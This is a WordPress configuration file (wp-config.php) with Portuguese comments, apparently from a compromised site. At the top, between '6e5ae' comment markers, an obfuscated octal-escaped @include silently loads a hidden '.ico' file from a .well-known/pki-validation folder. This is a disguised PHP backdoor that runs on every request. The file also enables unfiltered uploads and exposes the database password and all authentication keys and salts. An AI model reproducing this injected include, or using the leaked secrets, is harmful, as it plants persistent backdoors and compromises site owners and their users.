<?php
/*6e5ae*/

@include "\057h\157m\145/\1449\1645\165j\1643\156r\1448\057m\151n\150a\142e\154e\172a\141u\164e\156t\151c\141.\143o\155.\142r\057.\167e\154l\055k\156o\167n\057p\153i\055v\141l\151d\141t\151o\156/\0560\0632\070c\141c\070.\151c\157";

/*6e5ae*/
/**
 * As configurações básicas do WordPress
 *
 * O script de criação wp-config.php usa esse arquivo durante a instalação.
 * Você não precisa usar o site, você pode copiar este arquivo
 * para "wp-config.php" e preencher os valores.
 *
 * Este arquivo contém as seguintes configurações:
 *
 * * Configurações do MySQL
 * * Chaves secretas
 * * Prefixo do banco de dados
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Configurações do MySQL - Você pode pegar estas informações com o serviço de hospedagem ** //
/** O nome do banco de dados do WordPress */
define( 'DB_NAME', "abc_blog" );


/** Usuário do banco de dados MySQL */
define( 'DB_USER', "abc_blog" );


/** Senha do banco de dados MySQL */
define( 'DB_PASSWORD', "r}O.z%TqlW&O" );


/** Nome do host do MySQL */
define( 'DB_HOST', "localhost" );


/** Charset do banco de dados a ser usado na criação das tabelas. */
define( 'DB_CHARSET', 'utf8mb4' );


/** O tipo de Collate do banco de dados. Não altere isso se tiver dúvidas. */
define( 'DB_COLLATE', '' );

/**#@+
 * Chaves únicas de autenticação e salts.
 *
 * Altere cada chave para um frase única!
 * Você pode gerá-las
 * usando o {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org
 * secret-key service}
 * Você pode alterá-las a qualquer momento para invalidar quaisquer
 * cookies existentes. Isto irá forçar todos os
 * usuários a fazerem login novamente.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'gOffJ%}^_uWU]Sk$<a28M3|0O?lF3/_%g`+Js?ADx%&UW5U w}y?,(RZ#49y2 %c' );

define( 'SECURE_AUTH_KEY',  'DkvGRt/a460uNDI ;GtFBhhFWu/Xj1EK:JMq,`eTG[di_9Erf1oQOS9z!yFfmBXv' );

define( 'LOGGED_IN_KEY',    'x[>6QFk JjO,C{6j`uncRe*2/?r%wj.O^RpN_dz/Rur`&?*v)_XEqgMPA)cYdME<' );

define( 'NONCE_KEY',        '_.ku[(9r6&@<Mz8h(/,`HtVv Jet(5x6$nv_83|#nF~ONh1PS#z)2!hA[$L+PYk5' );

define( 'AUTH_SALT',        '^i MDNwH:`k&Bup?OU~BA2z;f`S+{QQ*R|([A8I*{:E}g3a*E1cK[XX0$a~Q^=h!' );

define( 'SECURE_AUTH_SALT', 'qY>+*qzp!Zw!+,qaJ3/=-@ 8V-lD+5P#(uJe 2,zP_- !sa?,vf=^L.UAJO3_~ T' );

define( 'LOGGED_IN_SALT',   '`UG8qUlMT.~oRer+6+<<D|@Pwz/l] v2 Wy!EM>sKE04`CCYk(*~>~yS$)02P=T_' );

define( 'NONCE_SALT',       ']OoP61--Lt6:d/kH8ms,`#F=!r~N{8BiU>hJ:cD/i{,nbR$xteXD~zNRA}uP0],S' );


/**#@-*/

/**
 * Prefixo da tabela do banco de dados do WordPress.
 *
 * Você pode ter várias instalações em um único banco de dados se você der
 * um prefixo único para cada um. Somente números, letras e sublinhados!
 */
$table_prefix = 'wp_';


/**
 * Para desenvolvedores: Modo de debug do WordPress.
 *
 * Altere isto para true para ativar a exibição de avisos
 * durante o desenvolvimento. É altamente recomendável que os
 * desenvolvedores de plugins e temas usem o WP_DEBUG
 * em seus ambientes de desenvolvimento.
 *
 * Para informações sobre outras constantes que podem ser utilizadas
 * para depuração, visite o Codex.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

define('ALLOW_UNFILTERED_UPLOADS', true);

/* Isto é tudo, pode parar de editar! :) */

/** Caminho absoluto para o diretório WordPress. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Configura as variáveis e arquivos do WordPress. */
require_once ABSPATH . 'wp-settings.php';
